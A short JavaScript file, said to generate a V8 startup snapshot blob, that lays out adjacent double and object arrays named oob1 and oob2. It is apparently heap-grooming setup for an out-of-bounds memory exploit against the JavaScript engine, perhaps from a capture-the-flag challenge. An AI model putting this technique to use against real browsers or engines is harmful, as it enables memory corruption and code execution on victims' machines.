// This JS source file is used to generate startup_blob.bin

var obj = {"A": 1};

// for whatever reason, using nested arrays like this keeps
// the sub-arrays adjacent on the heap, which is what we want
var oob1 = [
	new Array(0x137).fill(0),
	[1.1, 2.2, 3.3, 4.4] // FAST_DOUBLE_ELEMENTS
];

var oob2 = [
	new Array(0x139).fill(0),
	[obj, obj, obj, obj] // FAST_ELEMENTS
];
